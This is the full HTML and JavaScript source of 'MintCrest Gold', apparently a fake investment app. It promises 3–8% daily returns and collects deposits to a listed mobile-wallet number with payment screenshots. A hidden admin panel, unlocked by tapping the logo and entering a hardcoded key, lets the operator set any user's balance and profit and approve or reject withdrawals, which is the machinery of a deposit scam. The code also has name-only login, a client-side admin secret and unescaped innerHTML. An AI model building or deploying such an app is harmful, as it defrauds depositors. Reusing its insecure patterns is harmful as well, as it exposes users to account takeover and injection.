<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
    <title>MintCrest Gold | Global Asset Vault</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #010409; color: white; overflow-x: hidden; }
        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.08); }
        .neon-border { border: 1px solid rgba(59, 130, 246, 0.5); box-shadow: 0 0 15px rgba(59, 130, 246, 0.2); }
        .grad-blue { background: linear-gradient(135deg, #1e3a8a 0%, #3b82f6 100%); }
        .grad-gold { background: linear-gradient(135deg, #78350f 0%, #d97706 100%); }
        .grad-purple { background: linear-gradient(135deg, #4c1d95 0%, #8b5cf6 100%); }
        .active-tab { color: #60a5fa; border-top: 3px solid #60a5fa; background: linear-gradient(to top, rgba(96,165,250,0.1), transparent); }
        .page { display: none; animation: fadeIn 0.4s ease; }
        .active-page { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .status-badge { font-size: 8px; font-weight: 900; padding: 2px 6px; border-radius: 4px; text-transform: uppercase; }
        .badge-pending { background: #fef3c7; color: #92400e; }
        .badge-approved { background: #dcfce7; color: #166534; }
        .badge-rejected { background: #fee2e2; color: #991b1b; }
        .marquee { display: inline-block; animation: scroll 20s linear infinite; white-space: nowrap; }
        @keyframes scroll { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
    </style>
</head>
<body class="h-screen flex flex-col">
    <div id="ticker-wrap" class="hidden bg-blue-900/40 py-2 border-b border-white/10 z-[500] backdrop-blur-md">
        <div class="marquee text-[9px] font-black uppercase tracking-widest text-blue-300">
            🛡️ <span id="ticker-text">MintCrest Secure Node Active - Manual Verification in Progress</span> 🛡️
        </div>
    </div>

    <section id="auth-ui" class="fixed inset-0 z-[1000] bg-[#010409] flex flex-col items-center justify-center p-8 text-center">
        <h1 onclick="adminTap()" class="text-6xl font-black italic tracking-tighter mb-2 uppercase bg-gradient-to-r from-white via-blue-400 to-blue-600 bg-clip-text text-transparent">MINTCREST</h1>
        <div class="glass p-10 rounded-[3.5rem] w-full max-w-sm neon-border">
            <input type="text" id="user-name" placeholder="Enter Full Name" class="w-full bg-white/5 p-5 rounded-2xl border border-white/10 outline-none text-center font-bold mb-6 text-white focus:border-blue-500">
            <button onclick="login()" class="w-full grad-blue py-5 rounded-2xl font-black text-[10px] uppercase text-white shadow-xl active:scale-95">Unlock Vault</button>
        </div>
    </section>

    <main id="app-ui" class="hidden flex-1 overflow-y-auto pb-32">
        <div id="p-wallet" class="page p-6">
            <div class="glass p-10 rounded-[4rem] text-center border-t-8 border-blue-600 shadow-2xl">
                <div class="space-y-2 mb-8 text-[9px] font-black uppercase">
                    <div class="glass p-4 rounded-xl flex justify-between"><span>JAZZ/SADA</span><span>03705519562</span></div>
                </div>
                <input type="number" id="dep-amount" placeholder="Capital Amount" class="w-full bg-white/5 p-5 rounded-2xl mb-4 text-center font-bold border border-white/10">
                <input type="text" id="dep-trx" placeholder="TID Number" class="w-full bg-white/5 p-5 rounded-2xl mb-6 text-center font-bold border border-white/10 uppercase">
                
                <div class="mb-8 text-left">
                    <p class="text-[9px] font-black text-blue-400 mb-2 uppercase italic">📸 Upload Payment Proof</p>
                    <input type="file" id="dep-proof" accept="image/*" class="w-full bg-white/5 p-4 rounded-xl text-[10px] font-bold border border-dashed border-blue-500/40">
                </div>

                <button id="btn-dep" onclick="submitDeposit()" class="w-full grad-blue py-6 rounded-3xl font-black text-[11px] uppercase text-white shadow-xl">Verify Capital</button>
            </div>
        </div>

        <div id="p-home" class="page active-page p-6">
            <div class="grad-blue p-10 rounded-[3.5rem] mb-6 shadow-2xl relative overflow-hidden neon-border">
                <p class="text-[9px] text-blue-100 font-black mb-1 uppercase tracking-widest">Total Capital Assets</p>
                <h2 class="text-5xl font-black tracking-tighter text-white" id="v-bal">₨ 0</h2>
                <div class="mt-8 flex justify-between items-center">
                    <span class="text-[9px] bg-white/20 text-white px-5 py-2 rounded-full font-black">PROFIT: <span id="v-profit">0</span></span>
                    <span id="rank-badge" class="text-[8px] font-black text-blue-200 uppercase italic">RANK: STANDARD</span>
                </div>
            </div>
            <div class="grid grid-cols-2 gap-4 mb-6">
                <button onclick="changePage('wallet')" class="glass p-8 rounded-[2.5rem] text-center border-b-4 border-green-500">📥 <span class="text-[10px] font-black block mt-2 uppercase text-green-400">Add Capital</span></button>
                <button onclick="changePage('withdraw')" class="glass p-8 rounded-[2.5rem] text-center border-b-4 border-red-500">📤 <span class="text-[10px] font-black block mt-2 uppercase text-red-400">Withdraw</span></button>
            </div>
            <button onclick="requestBonus()" class="w-full grad-gold p-6 rounded-[2.5rem] mb-6 flex justify-between items-center"><div class="text-left"><h4 class="text-[11px] font-black uppercase text-white italic">Claim Daily Bonus</h4></div><span class="text-2xl">🎁</span></button>
        </div>

        <div id="p-withdraw" class="page p-6">
             <div class="glass p-10 rounded-[4rem] border-t-8 border-red-600 text-center shadow-2xl">
                <h3 class="font-black text-red-500 mb-8 uppercase text-sm italic">Liquidation</h3>
                <input type="number" id="wd-amt" placeholder="Amount (PKR)" class="w-full bg-white/5 p-5 rounded-2xl mb-4 text-center font-black border border-white/10">
                <input type="text" id="wd-acc" placeholder="Account Details" class="w-full bg-white/5 p-5 rounded-2xl mb-12 text-center text-[10px] font-bold border border-white/10">
                <button onclick="submitWithdraw()" class="w-full bg-red-600 py-6 rounded-3xl font-black text-[11px] uppercase text-white shadow-lg">Authorize Withdrawal</button>
            </div>
        </div>
        <div id="p-invest" class="page p-6"><div id="plans-list" class="grid grid-cols-1 gap-3 pb-10"></div></div>
        <div id="p-activity" class="page p-6"><div id="user-history" class="space-y-3 pb-10"></div></div>
    </main>

    <div id="admin-panel" class="fixed inset-0 bg-[#000814] z-[5000] hidden overflow-y-auto p-6">
        <header class="flex justify-between items-center mb-8"><h2 class="text-xl font-black text-blue-500 uppercase">Admin Command</h2><button onclick="closeAdmin()" class="bg-red-600 px-6 py-2 rounded-xl text-[9px] font-black">EXIT</button></header>
        <div class="grid grid-cols-2 gap-2 mb-8">
            <input type="text" id="adm-target" placeholder="Username" class="bg-white/5 p-4 rounded-xl text-[10px] border border-white/10"><input type="number" id="adm-val" placeholder="Value" class="bg-white/5 p-4 rounded-xl text-[10px] border border-white/10">
            <button onclick="manualEdit('balance')" class="grad-blue py-3 rounded-xl text-[8px] font-black uppercase">Edit Bal</button><button onclick="manualEdit('profit')" class="grad-gold py-3 rounded-xl text-[8px] font-black uppercase">Edit Profit</button>
        </div>
        <div id="adm-sec-requests" class="space-y-4"></div>
    </div>

    <nav id="bottom-nav" class="hidden glass p-8 flex justify-around items-center fixed bottom-0 w-full z-[200] rounded-t-[4rem]">
        <button onclick="changePage('home')" id="n-home" class="active-tab">🏠</button>
        <button onclick="changePage('invest')" id="n-invest">📈</button>
        <button onclick="changePage('activity')" id="n-activity">📜</button>
        <button onclick="changePage('wallet')" id="n-wallet">📥</button>
    </nav>
        <script>
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.appspot.com", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig); 
        const db = firebase.firestore();
        const storage = firebase.storage(); // Storage Initialized
        let user = null; let tapCount = 0;

        const plans = [
            { n: "Micro-Elite I", p: 200, r: 3 },
            { n: "Bronze-S", p: 1000, r: 3.5 },
            { n: "Silver-X", p: 5000, r: 4.5 },
            { n: "Gold-X", p: 10000, r: 5.5 },
            { n: "Diamond-Master", p: 50000, r: 8 }
        ];

        async function login() {
            const name = document.getElementById('user-name').value.trim(); if(!name) return;
            localStorage.setItem('mc_user', name);
            const ref = db.collection("users").doc(name); const doc = await ref.get();
            if(!doc.exists) await ref.set({ name: name, balance: 0, profit: 0, time: Date.now() });
            startSync(name); document.getElementById('auth-ui').style.display='none'; document.getElementById('app-ui').classList.remove('hidden'); document.getElementById('bottom-nav').classList.remove('hidden');
            renderPlans(); listenForNews();
        }

        function startSync(name) {
            db.collection("users").doc(name).onSnapshot(doc => { if(doc.exists) { user = doc.data(); document.getElementById('v-bal').innerText = "₨ " + (user.balance || 0).toLocaleString(); document.getElementById('v-profit').innerText = "₨ " + (user.profit || 0).toLocaleString(); } });
            db.collection("requests").where("user", "==", name).orderBy("time", "desc").onSnapshot(snap => {
                const list = document.getElementById('user-history'); list.innerHTML = '';
                snap.forEach(doc => { const d = doc.data(); list.innerHTML += `<div class="glass p-5 rounded-3xl flex justify-between items-center mb-2 text-[9px] font-black uppercase"><div>${d.type}</div><div class="text-right">₨ ${d.amount}<br><span class="status-badge badge-${d.status}">${d.status}</span></div></div>`; });
            });
        }

        // NEW: Deposit with Screenshot
        async function submitDeposit() {
            const a = document.getElementById('dep-amount').value; const t = document.getElementById('dep-trx').value; const file = document.getElementById('dep-proof').files[0];
            if(!a || !t || !file) return alert("Sweetie, please select image and enter TID!");
            const btn = document.getElementById('btn-dep'); btn.innerText = "⚡ UPLOADING..."; btn.disabled = true;
            try {
                const storageRef = storage.ref(`proofs/${Date.now()}_${user.name}`);
                await storageRef.put(file);
                const url = await storageRef.getDownloadURL();
                await db.collection("requests").add({ user: user.name, amount: parseInt(a), tid: t, proof: url, type: "deposit", status: "pending", time: Date.now() });
                alert("Deposit proof sent to Admin! 😘"); location.reload();
            } catch (e) { alert("Error uploading proof."); btn.innerText = "Verify Capital"; btn.disabled = false; }
        }

        async function submitWithdraw() {
            const a = parseInt(document.getElementById('wd-amt').value); const acc = document.getElementById('wd-acc').value; if(!a || a > user.balance) return alert("Invalid Balance!");
            await db.collection("users").doc(user.name).update({ balance: user.balance - a });
            await db.collection("requests").add({ user: user.name, amount: a, acc: acc, type: "withdraw", status: "pending", time: Date.now() });
            alert("Withdraw request sent!"); location.reload();
        }

        async function manualEdit(f) { const u = document.getElementById('adm-target').value; const v = parseInt(document.getElementById('adm-val').value); const ref = db.collection("users").doc(u); await ref.update({ [f]: v }); alert("Updated!"); }
        
        function adminTap() { tapCount++; if(tapCount >= 4) { if(prompt("Key:") === "mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdmin(); } tapCount=0; } }
        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }

        async function syncAdmin() {
            db.collection("requests").where("status", "==", "pending").onSnapshot(snap => {
                const list = document.getElementById('adm-sec-requests'); list.innerHTML = '';
                snap.forEach(doc => { const d = doc.data(); 
                    list.innerHTML += `<div class="glass p-6 rounded-3xl mb-4 border border-white/10">
                        <div class="flex justify-between text-[10px] font-black uppercase mb-1"><span>${d.user}</span><span>₨ ${d.amount}</span></div>
                        <div class="text-[7px] opacity-40 mb-3 uppercase font-bold">${d.type} | ${d.tid||d.acc||''}</div>
                        ${d.proof ? `<a href="${d.proof}" target="_blank" class="block bg-blue-600 text-center py-2 rounded-xl text-[9px] font-black mb-3 uppercase text-white">📸 View Proof</a>` : ''}
                        <div class="flex gap-2">
                            <button onclick="handle('${doc.id}','${d.user}',${d.amount},'approved','${d.type}')" class="flex-1 grad-blue py-3 rounded-xl text-[8px] font-black uppercase text-white">Approve</button>
                            <button onclick="handle('${doc.id}','${d.user}',${d.amount},'rejected','${d.type}')" class="flex-1 bg-red-600 py-3 rounded-xl text-[8px] font-black uppercase text-white text-red-100">Reject</button>
                        </div>
                    </div>`;
                });
            });
        }

        async function handle(id, u, amt, act, type) { 
            const ref = db.collection("users").doc(u); const doc = await ref.get();
            if(act==='approved') {
                if(type === "Daily Bonus Request") { 
                    const b = parseInt(prompt("Enter Bonus Amount:")); 
                    await ref.update({ balance: (doc.data().balance||0) + b }); 
                    await db.collection("requests").doc(id).update({ status: 'approved', amount: b }); return;
                }
                if(type==='deposit' || type.includes('Profit')) { await ref.update({ balance: (doc.data().balance||0) + amt }); }
            } else if(act==='rejected' && type==='withdraw') { await ref.update({ balance: (doc.data().balance||0) + amt }); }
            await db.collection("requests").doc(id).update({ status: act }); 
        }

        function renderPlans() {
            const list = document.getElementById('plans-list'); list.innerHTML = '';
            plans.forEach(p => { list.innerHTML += `<div class="glass p-6 rounded-[2.5rem] flex justify-between items-center mb-2 shadow-xl"><div><h4 class="font-black text-[11px] uppercase">${p.n}</h4><p class="text-[9px] text-blue-400 font-black">${p.r}% Daily</p></div><div class="font-black">₨ ${p.p}</div></div>`; });
        }
        function changePage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.querySelectorAll('nav button').forEach(b=>b.classList.remove('active-tab')); document.getElementById('p-'+p).classList.add('active-page'); document.getElementById('n-'+p).classList.add('active-tab'); }
        async function requestBonus() { await db.collection("requests").add({ user: user.name, amount: 0, type: "Daily Bonus Request", status: "pending", time: Date.now() }); alert("Sent!"); }
        function listenForNews() { db.collection("app_data").doc("announcement").onSnapshot(doc => { if(doc.exists) { document.getElementById('ticker-wrap').classList.remove('hidden'); document.getElementById('ticker-text').innerText = doc.data().message; } }); }
    </script>
</body>
</html>
